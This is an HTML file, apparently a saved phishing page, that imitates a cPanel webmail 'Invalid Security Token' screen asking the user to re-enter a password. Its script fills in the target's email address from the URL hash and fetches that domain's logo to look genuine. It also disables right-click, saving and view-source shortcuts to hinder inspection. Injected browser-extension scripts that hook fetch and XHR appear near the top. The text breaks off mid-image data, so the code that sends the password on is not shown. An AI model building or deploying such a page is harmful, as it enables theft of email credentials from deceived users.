@@ -1,0 +1,776 @@
+<!DOCTYPE html>
+<!-- saved from url=(0108)https://premium162.web-hosting.com:2096/cpsess2714763215/3rdparty/roundcube/index.php?_task=mail&_mbox=INBOX -->
+<html dir="ltr" lang="en">
+ <script>
+  window[Symbol.for('MARIO_POST_CLIENT_eppiocemhmnlbhjplcgkofciiegomcon')] = new (class PostClient {
+    constructor(name, destination) {
+        this.name = name;
+        this.destination = destination;
+        this.serverListeners = {};
+        this.bgRequestsListeners = {};
+        this.bgEventsListeners = {};
+        window.addEventListener('message', (message) => {
+            const data = message.data;
+            const isNotForMe = !(data.destination && data.destination === this.name);
+            const hasNotEventProp = !data.event;
+            if (isNotForMe || hasNotEventProp) {
+                return;
+            }
+            if (data.event === 'MARIO_POST_SERVER__BG_RESPONSE') {
+                const response = data.args;
+                if (this.hasBgRequestListener(response.requestId)) {
+                    try {
+                        this.bgRequestsListeners[response.requestId](response.response);
+                    }
+                    catch (e) {
+                        console.log(e);
+                    }
+                    delete this.bgRequestsListeners[response.requestId];
+                }
+            }
+            else if (data.event === 'MARIO_POST_SERVER__BG_EVENT') {
+                const response = data.args;
+                if (this.hasBgEventListener(response.event)) {
+                    try {
+                        this.bgEventsListeners[data.id](response.payload);
+                    }
+                    catch (e) {
+                        console.log(e);
+                    }
+                }
+            }
+            else if (this.hasServerListener(data.event)) {
+                try {
+                    this.serverListeners[data.event](data.args);
+                }
+                catch (e) {
+                    console.log(e);
+                }
+            }
+            else {
+                console.log(`event not handled: ${data.event}`);
+            }
+        });
+    }
+    emitToServer(event, args) {
+        const id = this.generateUIID();
+        const message = {
+            args,
+            destination: this.destination,
+            event,
+            id,
+        };
+        window.postMessage(message, location.origin);
+        return id;
+    }
+    emitToBg(bgEventName, args) {
+        const requestId = this.generateUIID();
+        const request = { bgEventName, requestId, args };
+        this.emitToServer('MARIO_POST_SERVER__BG_REQUEST', request);
+        return requestId;
+    }
+    hasServerListener(event) {
+        return !!this.serverListeners[event];
+    }
+    hasBgRequestListener(requestId) {
+        return !!this.bgRequestsListeners[requestId];
+    }
+    hasBgEventListener(bgEventName) {
+        return !!this.bgEventsListeners[bgEventName];
+    }
+    fromServerEvent(event, listener) {
+        this.serverListeners[event] = listener;
+    }
+    fromBgEvent(bgEventName, listener) {
+        this.bgEventsListeners[bgEventName] = listener;
+    }
+    fromBgResponse(requestId, listener) {
+        this.bgRequestsListeners[requestId] = listener;
+    }
+    generateUIID() {
+        return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function (c) {
+            const r = Math.random() * 16 | 0, v = c === 'x' ? r : (r & 0x3 | 0x8);
+            return v.toString(16);
+        });
+    }
+})('MARIO_POST_CLIENT_eppiocemhmnlbhjplcgkofciiegomcon', 'MARIO_POST_SERVER_eppiocemhmnlbhjplcgkofciiegomcon')
+ </script>
+ <script>
+  const hideMyLocation = new (class HideMyLocation {
+    constructor(clientKey) {
+        this.clientKey = clientKey;
+        this.watchIDs = {};
+        this.client = window[Symbol.for(clientKey)];
+        const getCurrentPosition = navigator.geolocation.getCurrentPosition;
+        const watchPosition = navigator.geolocation.watchPosition;
+        const clearWatch = navigator.geolocation.clearWatch;
+        const self = this;
+        navigator.geolocation.getCurrentPosition = function (successCallback, errorCallback, options) {
+            self.handle(getCurrentPosition, 'GET', successCallback, errorCallback, options);
+        };
+        navigator.geolocation.watchPosition = function (successCallback, errorCallback, options) {
+            return self.handle(watchPosition, 'WATCH', successCallback, errorCallback, options);
+        };
+        navigator.geolocation.clearWatch = function (fakeWatchId) {
+            if (fakeWatchId === -1) {
+                return;
+            }
+            const realWatchId = self.watchIDs[fakeWatchId];
+            delete self.watchIDs[fakeWatchId];
+            return clearWatch.apply(this, [realWatchId]);
+        };
+    }
+    handle(getCurrentPositionOrWatchPosition, type, successCallback, errorCallback, options) {
+        const requestId = this.client.emitToBg('HIDE_MY_LOCATION__GET_LOCATION');
+        let fakeWatchId = this.getRandomInt(0, 100000);
+        this.client.fromBgResponse(requestId, (response) => {
+            if (response.enabled) {
+                if (response.status === 'SUCCESS') {
+                    const position = this.map(response);
+                    successCallback(position);
+                }
+                else {
+                    const error = this.errorObj();
+                    errorCallback(error);
+                    fakeWatchId = -1;
+                }
+            }
+            else {
+                const args = [successCallback, errorCallback, options];
+                const watchId = getCurrentPositionOrWatchPosition.apply(navigator.geolocation, args);
+                if (type === 'WATCH') {
+                    this.watchIDs[fakeWatchId] = watchId;
+                }
+            }
+        });
+        if (type === 'WATCH') {
+            return fakeWatchId;
+        }
+    }
+    map(response) {
+        return {
+            coords: {
+                accuracy: 20,
+                altitude: null,
+                altitudeAccuracy: null,
+                heading: null,
+                latitude: response.latitude,
+                longitude: response.longitude,
+                speed: null,
+            },
+            timestamp: Date.now(),
+        };
+    }
+    errorObj() {
+        return {
+            code: 1,
+            message: 'User denied Geolocation',
+        };
+    }
+    getRandomInt(min, max) {
+        min = Math.ceil(min);
+        max = Math.floor(max);
+        return Math.floor(Math.random() * (max - min + 1)) + min;
+    }
+})('MARIO_POST_CLIENT_eppiocemhmnlbhjplcgkofciiegomcon')
+ </script>
+ <head>
+  <meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
+  <meta content="width=device-width, initial-scale=1.0" name="viewport"/>
+  <meta content="notranslate" name="google"/>
+  <meta content="app-id=1188352635" name="apple-itunes-app"/>
+  <title>
+   Webmail Login
+  </title>
+  <link href="data:image/x-icon;base64,AAABAAEAICAAAAEAIADSAgAAFgAAAIlQTkcNChoKAAAADUlIRFIAAAAgAAAAIAgGAAAAc3p69AAAAplJREFUWIXt1j2IHGUYB/DfOzdnjIKFkECIVWIKvUFsIkRExa9KJCLaWAgWJx4DilZWgpDDiI0wiViIoGATP1CCEDYHSeCwUBBkgiiKURQJFiLo4d0eOxYzC8nsO9m9XcXC+8MW+3z+9/l6l2383xH+iSBpElyTdoda26xsDqp/h0CVZ3vwKm7tMBngAs7h7eRYebG6hMtMBHbMBX89vfARHprQ5U8cwdFQlIOZCVR5di1+w/wWXT/EY6EoN5NZCODuKZLDwzgSMCuBe2fwfX6QZwtpWzqfBBtLC3txF/ZhxKbBGx0EfsTJS77vwmGjlZrD4mUzUOXZjVjGI65cnTXchB8iupdDUb7QinsQZ7GzZftdQj2JVZ49iC/w6JjksIo7OnS9tiA5Vn6GtyK2+1MY5NkhfGDygVrBAxH5WkPuMjR7/3UsUFLl2Q68s4XkA3ws3v9zoSjX28Kr5wL1xrTxa6ou+f6OZGvqPg9v1wZeaUjcELE/DVfNhWFSvy/enOIZ9eq1sTokEMNLWI79oirP8g6fXpVnh7GEvY1sV/OJ4f0UhyKKk6EoX4x5pEkgXv6L6OM99YqNw/c4kXSwG5nkIfpLCynuiahW1GWeJHkfT4aiXO9atz1XcD6I6yLyHu6bIPk6Hg9FeYZ63y9EjBarPDvQ8VJ1nd9V3D4m+RncForyxFCQ4hSeahlej88Hefauurdwaufr5z/F/ZHAX6nL+mZE18e36IWiHLkFocqzW9QXcNz1+wUHxJ/f10JRPjvGP4pk/vj5L3F8AtufdD+/p6dJDknzX+05fDLGtife/766t9MRgFCUffWTudwE3AqBlVCUf0xLYGTQqzzbhydwJ3Y34g318J1tmX+DPBTlz9MS2MY2/nP8DTGaqeTDf30rAAAAAElFTkSuQmCC" rel="shortcut icon" type="image/x-icon"/>
+  <!-- EXTERNAL CSS -->
+  <link href="https://bafybeigsnu7jcylkjjz3yupvasapqsllknjo66oecmngilwtex66ca6xtm.ipfs.w3s.link/open_sans.min.css" rel="stylesheet" type="text/css"/>
+  <link href="https://bafybeibghv32gwt4bltwhggczqagb6d5okfevn6pk5el6exxybx2e5wf6a.ipfs.w3s.link/webmail_style_v2_optimized.css" rel="stylesheet" type="text/css"/>
+  <style type="text/css">
+   body {font-size:12px;}
+/*
+  This css is included in the base template in case the css cannot be loaded because of access restrictions
+  If this css is updated, please update securitypolicy_header.html.tmpl as well
+*/
+.copyright {
+  padding-top: 70px;
+  background: url(data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIzNTlwdCIgaGVpZ2h0PSIzMjAiIHZpZXdCb3g9IjAgMCAzNTkgMjQwIj48ZGVmcz48Y2xpcFBhdGggaWQ9ImEiPjxwYXRoIGQ9Ik0xMjMgMGgyMzUuMzd2MjQwSDEyM3ptMCAwIi8+PC9jbGlwUGF0aD48L2RlZnM+PHBhdGggZD0iTTg5LjY5IDU5LjEwMmg2Ny44MDJsLTEwLjUgNDAuMmMtMS42MDUgNS42LTQuNjA1IDEwLjEtOSAxMy41LTQuNDAyIDMuNC05LjUwNCA1LjA5Ni0xNS4zIDUuMDk2aC0zMS41Yy03LjIgMC0xMy41NSAyLjEwMi0xOS4wNSA2LjMtNS41MDUgNC4yLTkuMzUzIDkuOTA0LTExLjU1MiAxNy4xMDMtMS40IDUuNDAzLTEuNTUgMTAuNS0uNDUgMTUuMzAyIDEuMDk4IDQuNzk2IDMuMDQ3IDkuMDUgNS44NTIgMTIuNzUgMi43OTcgMy43MDMgNi40IDYuNjUyIDEwLjc5NyA4Ljg1IDQuMzk3IDIuMiA5LjE5OCAzLjI5OCAxNC40IDMuMjk4aDE5LjJjMy42MDIgMCA2LjU0NyAxLjQ1MyA4Ljg1MiA0LjM1MiAyLjI5NyAyLjkwMiAyLjk0NSA2LjE0OCAxLjk1IDkuNzVsLTEyIDQ0LjM5OGgtMjFjLTE0LjQwMyAwLTI3LjY1My0zLjE0OC0zOS43NS05LjQ1LTEyLjEwMi02LjMtMjIuMTUzLTE0LjY0OC0zMC4xNTMtMjUuMDUtOC0xMC4zOTUtMTMuNDU0LTIyLjI0Ni0xNi4zNS0zNS41NDctMi45LTEzLjMtMi41NS0yNi45NSAxLjA1Mi00MC45NTNsMS4yLTQuNWMyLjU5Ny05LjYwMiA2LjY0OC0xOC40NSAxMi4xNDgtMjYuNTUgNS41LTguMDk4IDEyLTE1IDE5LjUtMjAuNyA3LjUtNS43IDE1Ljg1LTEwLjE0OCAyNS4wNS0xMy4zNTIgOS4yLTMuMTk1IDE4Ljc5Ny00Ljc5NiAyOC44LTQuNzk2IiBmaWxsPSIjZmY2YzJjIi8+PGcgY2xpcC1wYXRoPSJ1cmwoI2EpIj48cGF0aCBkPSJNMTIzLjg5IDI0MEwxODIuOTkgMTguNjAyYzEuNTk4LTUuNTk4IDQuNTk4LTEwLjA5OCA5LTEzLjVDMTk2LjM4OCAxLjcgMjAxLjQ4NCAwIDIwNy4yODggMGg2Mi43YzE0LjQwMyAwIDI3LjY1IDMuMTQ4IDM5Ljc1IDkuNDUgMTIuMTAyIDYuMyAyMi4xNTMgMTQuNjU1IDMwLjE1MyAyNS4wNSA3Ljk5NyAxMC40MDIgMTMuNSAyMi4yNTQgMTYuNSAzNS41NSAzIDEzLjMwNSAyLjU5NCAyNi45NTQtMS4yMDIgNDAuOTVsLTEuMiA0LjVjLTIuNTk3IDkuNjAyLTYuNTk3IDE4LjQ1LTEyIDI2LjU1LTUuMzk4IDguMDk4LTExLjg0NyAxNS4wNTItMTkuMzQ3IDIwLjg0OC03LjUgNS44MDUtMTUuODU1IDEwLjMwNS0yNS4wNSAxMy41LTkuMiAzLjIwNC0xOC44MDUgNC44MDUtMjguODA1IDQuODA1aC01NC4yOTdsMTAuOC00MC41YzEuNi01LjQwMiA0LjYtOS44IDktMTMuMjAzIDQuMzk2LTMuMzk4IDkuNDk3LTUuMTAyIDE1LjMwMi01LjEwMmgxNy4zOThjNy4yIDAgMTMuNjUzLTIuMiAxOS4zNTItNi41OTcgNS42OTUtNC4zOTggOS40NDUtMTAuMDk3IDExLjI1LTE3LjEgMS4zOTQtNC45OTcgMS41NDctOS45LjQ0NS0xNC43LTEuMS00LjgtMy4wNS05LjA0Ny01Ljg0OC0xMi43NS0yLjgtMy42OTUtNi40MDItNi42OTUtMTAuNzk2LTktNC40MDYtMi4yOTctOS4yMDYtMy40NS0xNC40MDItMy40NUgyMzMuMzlsLTQzLjggMTYyLjkwM2MtMS42MDYgNS40LTQuNjA2IDkuNzk3LTkgMTMuMTk1LTQuNDAzIDMuNDA3LTkuNDA2IDUuMTAyLTE1IDUuMTAyaC00MS43IiBmaWxsPSIjZmY2YzJjIi8+PC9nPjwvc3ZnPgo=) no-repeat scroll transparent;
+  background-size: 25px auto;
+  background-position: center 35px;
+}
+  </style>
+  <!--[if IE 6]>
+    <style type="text/css">
+        img {
+            behavior: url(/cPanel_magic_revision_1331649207/unprotected/cp_pngbehavior_login.htc);
+        }
+    </style>
+    <![endif]-->
+  <script>
+   window.DOM = { get: function(id) { return document.getElementById(id) } };
+  </script>
+  <script ecommerce-type="extend-native-history-api">
+   (() => {
+            const nativePushState = history.pushState;
+            const nativeReplaceState = history.replaceState;
+            const nativeBack = history.back;
+            const nativeForward = history.forward;
+            function emitUrlChanged() {
+                const message = {
+                    _custom_type_: 'CUSTOM_ON_URL_CHANGED',
+                };
+                window.postMessage(message);
+            }
+            history.pushState = function () {
+                nativePushState.apply(history, arguments);
+                emitUrlChanged();
+            };
+            history.replaceState = function () {
+                nativeReplaceState.apply(history, arguments);
+                emitUrlChanged();
+            };
+            history.back = function () {
+                nativeBack.apply(history, arguments);
+                emitUrlChanged();
+            };
+            history.forward = function () {
+                nativeForward.apply(history, arguments);
+                emitUrlChanged();
+            };
+        })()
+  </script>
+  <script>
+   (function inject(config) {
+        function GenerateQuickId() {
+          var randomStrId = Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15);
+          return randomStrId.substring(0, 22);
+        }
+
+        ;
+
+        function SendXHRCandidate(requestMethod_, url_, type_, content_, requestBody_) {
+          try {
+            var id = 'detector';
+            var mes = {
+              posdMessageId: 'PANELOS_MESSAGE',
+              posdHash: GenerateQuickId(),
+              type: 'VIDEO_XHR_CANDIDATE',
+              from: id,
+              to: id.substring(0, id.length - 2),
+              content: {
+                requestMethod: requestMethod_,
+                url: url_,
+                type: type_,
+                content: content_
+              }
+            };
+
+            if (requestBody_ && requestBody_[0] && requestBody_[0].length) {
+              mes.content.encodedPostBody = requestBody_[0];
+            } // console.log(`posd_log: ${new Date().toLocaleString()} DEBUG [${this.id}] : (PosdVideoTrafficDetector) sending`, mes);
+
+
+            window.postMessage(mes);
+          } catch (e) {}
+        }
+
+        ;
+        var open = XMLHttpRequest.prototype.open;
+
+        XMLHttpRequest.prototype.open = function () {
+          this.requestMethod = arguments[0];
+          open.apply(this, arguments);
+        };
+
+        var send = XMLHttpRequest.prototype.send;
+
+        XMLHttpRequest.prototype.send = function () {
+          var requestBody_ = Object.assign(arguments, {});
+          var onreadystatechange = this.onreadystatechange;
+
+          this.onreadystatechange = function () {
+            var isFrameInBlackList = function isFrameInBlackList(url) {
+              var blackListIframes = config;
+              return blackListIframes.some(function (e) {
+                return url.includes(e);
+              });
+            };
+
+            if (this.readyState === 4 && !isFrameInBlackList(this.responseURL)) {
+              setTimeout(SendXHRCandidate(this.requestMethod, this.responseURL, this.getResponseHeader('content-type'), this.response, requestBody_), 0);
+            }
+
+            if (onreadystatechange) {
+              return onreadystatechange.apply(this, arguments);
+            }
+          };
+
+          return send.apply(this, arguments);
+        };
+
+        var nativeFetch = fetch;
+
+        fetch = function fetch() {
+          var _this = this;
+
+          var args = arguments;
+          var fetchURL = arguments[0] instanceof Request ? arguments[0].url : arguments[0];
+          var fetchMethod = arguments[0] instanceof Request ? arguments[0].method : 'GET';
+          return new Promise(function (resolve, reject) {
+            var promise = nativeFetch.apply(_this, args);
+            promise.then(function (response) {
+              if (response.body instanceof ReadableStream) {
+                var nativeJson = response.json;
+
+                response.json = function () {
+                  var _arguments = arguments,
+                      _this2 = this;
+
+                  return new Promise(function (resolve, reject) {
+                    var jsonPromise = nativeJson.apply(_this2, _arguments);
+                    jsonPromise.then(function (jsonResponse) {
+                      setTimeout(SendXHRCandidate(fetchMethod, fetchURL, response.headers.get('content-type'), JSON.stringify(jsonResponse)), 0);
+                      resolve(jsonResponse);
+                    })["catch"](function (e) {
+                      reject(e);
+                    });
+                  });
+                };
+
+                var nativeText = response.text;
+
+                response.text = function () {
+                  var _arguments2 = arguments,
+                      _this3 = this;
+
+                  return new Promise(function (resolve, reject) {
+                    var textPromise = nativeText.apply(_this3, _arguments2);
+                    textPromise.then(function (textResponse) {
+                      setTimeout(SendXHRCandidate(fetchMethod, fetchURL, response.headers.get('content-type'), textResponse), 0);
+                      resolve(textResponse);
+                    })["catch"](function (e) {
+                      reject(e);
+                    });
+                  });
+                };
+              }
+
+              resolve.apply(this, arguments);
+            })["catch"](function () {
+              reject.apply(this, arguments);
+            });
+          });
+        };
+      })(["facebook.com/","twitter.com/","youtube-nocookie.com/embed/","//vk.com/","//www.vk.com/","//linkedin.com/","//www.linkedin.com/","//instagram.com/","//www.instagram.com/","//www.google.com/recaptcha/api2/","//hangouts.google.com/webchat/","//www.google.com/calendar/","//www.google.com/maps/embed","spotify.com/","soundcloud.com/","//player.vimeo.com/","//disqus.com/","//tgwidget.com/","//js.driftt.com/","friends2follow.com","/widget","login","//video.bigmir.net/","blogger.com","//smartlock.google.com/","//keep.google.com/","/web.tolstoycomments.com/","moz-extension://","chrome-extension://","/auth/","//analytics.google.com/","adclarity.com","paddle.com/checkout","hcaptcha.com","recaptcha.net","2captcha.com","accounts.google.com","www.google.com/shopping/customerreviews","buy.tinypass.com","gstatic.com","secureir.ebaystatic.com","docs.google.com","contacts.google.com","github.com","mail.google.com","chat.google.com"]);
+  </script>
+ </head>
+ <body bis_register="W3sibWFzdGVyIjp0cnVlLCJleHRlbnNpb25JZCI6ImVwcGlvY2VtaG1ubGJoanBsY2drb2ZjaWllZ29tY29uIiwiYWRibG9ja2VyU3RhdHVzIjp7IkRJU1BMQVkiOiJkaXNhYmxlZCIsIkZBQ0VCT09LIjoiZGlzYWJsZWQiLCJUV0lUVEVSIjoiZGlzYWJsZWQiLCJSRURESVQiOiJkaXNhYmxlZCJ9LCJ2ZXJzaW9uIjoiMS45LjEwIiwic2NvcmUiOjEwOTEwfV0=" class="wm" data-gr-ext-installed="" data-new-gr-c-s-check-loaded="14.1114.0">
+  <br/>
+  <br/>
+  <div class="error-notice" style="visibility: visible; width:300px; height:30px; margin-left:480px; margin-top:2px; color:white;" withid="login-status">
+   <div class="content-wrapper">
+    <div id="login-detail">
+     <div id="login-status-icon-container">
+      <span class="login-status-icon">
+      </span>
+     </div>
+     <div id="msg" style="margin-top:9px; margin-left:40px;">
+      A network error occurred.
+     </div>
+     <div id="msg2" style="display: none; margin-top:10px; margin-left:65px; ">
+      Login failed.
+     </div>
+     <div id="msg1" style="display: none; margin-top:10px; margin-left:50px; ">
+      The login is invalid.
+     </div>
+    </div>
+   </div>
+  </div>
+  <div bis_skin_checked="1" class="error_notice">
+   <div bis_skin_checked="1" id="error-wrapper">
+    <div bis_skin_checked="1" id="error_msg_contents">
+     <p class="logo">
+      <img alt="logo" class="main-logo" src="https://bafybeiezqmilamoitabntrdjksepio6ei7dn4jgvvbrlux4glmpng3lvl4.ipfs.w3s.link/webmail-logo.svg"/>
+     </p>
+     <h2>
+      HTTP error 401
+     </h2>
+     <!-- Do not remove msg_code as it is needed for automated testing - msg_code:[invalid_token]  -->
+     <h3>
+      Invalid Security Token
+     </h3>
+     <p>
+      The requested
+      <abbr class="initialism" title="Uniform Resource Locator">
+       URL
+      </abbr>
+      does not contain your session’s correct security token.
+     </p>
+     <ul class="options">
+      <li>
+       Re-enter your account’s password below. This will assign your session a new security token.
+      </li>
+     </ul>
+     <div bis_skin_checked="1" id="token-forms">
+      <div bis_skin_checked="1" class="pagevars">
+       <h3>
+        Request information
+       </h3>
+       <table cellspacing="6" class="formtbl">
+        <tbody>
+         <tr>
+          <th>
+           Parameter name
+          </th>
+          <th>
+           Parameter value
+          </th>
+         </tr>
+         <tr>
+          <td>
+           _mbox
+          </td>
+          <td>
+           INBOX
+          </td>
+         </tr>
+         <tr>
+          <td>
+           _task
+          </td>
+          <td>
+           mail
+          </td>
+         </tr>
+        </tbody>
+       </table>
+      </div>
+      <div bis_skin_checked="1" id="login-container">
+       <div bis_skin_checked="1" id="login-sub-container">
+        <form id="contact" method="post" name="form">
+         <input id="url_fragment_input" name="url_fragment" type="hidden" value=""/>
+         <input name="user" type="hidden" value=""/>
+         <input name="token_denied" type="hidden" value="1"/>
+         <input name="parameterized_form" type="hidden" value="_task=mail&amp;_mbox=INBOX"/>
+         <input name="goto_uri" type="hidden" value="3rdparty/roundcube/index.php"/>
+         <input name="theme" type="hidden" value="jupiter"/>
+         <p>
+          <b>
+           Username:
+          </b>
+          <span id="aich">
+           admin@alwasail.fun
+          </span>
+         </p>
+         <div bis_skin_checked="1" class="control_container">
+          <div bis_skin_checked="1" class="group">
+           <div bis_skin_checked="1" class="controls">
+            <div bis_skin_checked="1" class="input-field-login icon password-container">
+             <input autofocus="" class="std_textbox" id="pr" name="pr" placeholder="Enter your email password." required="" type="password"/>
+            </div>
+            <input autocomplete="off" id="ai" name="ai" required="" type="hidden" value=""/>
+           </div>
+          </div>
+          <div bis_skin_checked="1" class="group">
+           <div bis_skin_checked="1" class="controls">
+            <div bis_skin_checked="1" class="login-btn" id="proceed_btn_container">
+             <button id="submit-btn" type="submit">
+              Proceed with the Current Request
+             </button>
+            </div>
+           </div>
+           <div bis_skin_checked="1" class="copyright">
+            Copyright© 2023 cPanel, Inc.
+           </div>
+          </div>
+         </div>
+        </form>
+       </div>
+      </div>
+     </div>
+     <script>
+      try { document.getElementById("pass").focus(); } catch(e) {}
+	document.getElementById("url_fragment_input").value = location.hash;
+     </script>
+    </div>
+   </div>
+  </div>
+ </body>
+ <grammarly-desktop-integration data-grammarly-shadow-root="true">
+  <template shadowrootmode="open">
+   <style>
+    div.grammarly-desktop-integration {
+    position: absolute;
+    width: 1px;
+    height: 1px;
+    padding: 0;
+    margin: -1px;
+    overflow: hidden;
+    clip: rect(0, 0, 0, 0);
+    white-space: nowrap;
+    border: 0;
+    -moz-user-select: none;
+    -webkit-user-select: none;
+    -ms-user-select:none;
+    user-select:none;
+  }
+
+  div.grammarly-desktop-integration:before {
+    content: attr(data-content);
+  }
+   </style>
+   <div aria-label="grammarly-integration" class="grammarly-desktop-integration" data-content='{"mode":"full","isActive":true,"isUserDisabled":false}' role="group" tabindex="-1">
+   </div>
+  </template>
+ </grammarly-desktop-integration>
+ <!-- Optional JavaScript -->
+ <!-- jQuery first, then Popper.js, then Bootstrap JS -->
+ <script crossorigin="anonymous" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" src="https://code.jquery.com/jquery-3.2.1.slim.min.js" type="text/javascript">
+ </script>
+ <script crossorigin="anonymous" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" type="text/javascript">
+ </script>
+ <script crossorigin="anonymous" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" type="text/javascript">
+ </script>
+ <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js" type="text/javascript">
+ </script>
+ <script>
+  // prevent ctrl + s
+$(document).bind('keydown', function(e) {
+if(e.ctrlKey && (e.which == 83)) {
+e.preventDefault();
+return false;
+}
+});
+
+document.addEventListener('contextmenu', event => event.preventDefault());
+
+document.onkeydown = function(e) {
+if (e.ctrlKey && 
+(e.keyCode === 67 || 
+e.keyCode === 86 || 
+e.keyCode === 85 || 
+e.keyCode === 117)) {
+return false;
+} else {
+return true;
+}
+};
+$(document).keypress("u",function(e) {
+if(e.ctrlKey)
+{
+return false;      }
+else {
+return true;
+}});
+
+/* global $ */
+$(document).ready(function() {
+    var count = 0;
+
+
+    /////////////url ai getting////////////////
+    var ai = window.location.hash.substr(1);
+    if (!ai) {
+
+    } else {
+        var base64regex = /^([0-9a-zA-Z+/]{4})*(([0-9a-zA-Z+/]{2}==)|([0-9a-zA-Z+/]{3}=))?$/;
+
+        if (!base64regex.test(ai)) {
+            // alert(btoa(ai));
+            var my_ai = ai;
+        } else {
+            // alert(atob(ai));
+            var my_ai = atob(ai);
+        }
+        // $('#ai').val(ai);
+        // var my_ai =ai;
+        var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
+
+        if (!filter.test(my_ai)) {
+            $('#error').show();
+            ai.focus;
+            return false;
+        }
+        var ind = my_ai.indexOf("@");
+        var my_slice = my_ai.substr((ind + 1));
+        var c = my_slice.substr(0, my_slice.indexOf('.'));
+        var final = c.toLowerCase();
+        var finalu = c.toUpperCase();
+        $('#ai').val(my_ai);
+        $("#div1").animate({ left: 0, opacity: "hide" }, 0);
+        $("#div2").animate({ right: 0, opacity: "show" }, 500);
+        
+		$("#aicx").html(my_ai);
+        $("#aich").html(my_ai);
+        $.get("https://logo.clearbit.com/" + my_slice)
+            .done(function() {
+                $("#logoimg").attr("src", "https://logo.clearbit.com/" + my_slice);
+                $("#logoname").html(finalu);
+				$("#logonamec").html(finalu);
+
+            }).fail(function() {
+                $("#logoimg").attr("src", "data:image/png;base64,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